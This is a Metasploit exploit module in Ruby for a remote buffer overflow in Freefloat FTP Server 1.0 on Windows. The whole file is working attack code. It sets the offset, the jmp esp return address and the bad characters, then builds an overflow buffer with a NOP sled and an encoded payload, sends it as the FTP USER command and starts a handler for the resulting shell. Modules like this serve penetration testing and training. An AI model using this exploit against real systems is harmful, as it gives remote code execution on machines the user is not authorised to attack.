
class MetasploitModule < Msf::Exploit::Remote
 
    include Msf::Exploit::Remote::Ftp
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Freefloat FTP Server 1.0',
      'Description'    => %q{
        This module exploits a remote buffer overflow in Freefloat FTP Server 1.0
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Hans LÃ³pez Mendoza',           
        ],
      'References'     =>
        [
          [ 'CVE', 'NA' ],
          [ 'EDB', '46762' ]
        ],
      'Platform'       => 'win',
      'Payload'        =>
        {
          'BadChars' => "\x00\x0a\x0d"
        },
      'Targets'        =>
        [
          [ 'Freefloat FTP Server 1.0',
            {  
              'Ret' => 0x7e6b30d7, # jmp esp
              'Offset' => 230
            }
          ],
        ],
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(21)])

  end

  def exploit
    connect

    print_status("Generating exploit...")  
    evil =  rand_text(target['Offset'])
    evil << [target.ret].pack('V')
    evil << make_nops(100)
    evil << payload.encoded
    evil << make_nops(800 - evil.length)

    print_status("Triggering the exploit now...")

    send_user(evil)

    handler
    disconnect

  end
end
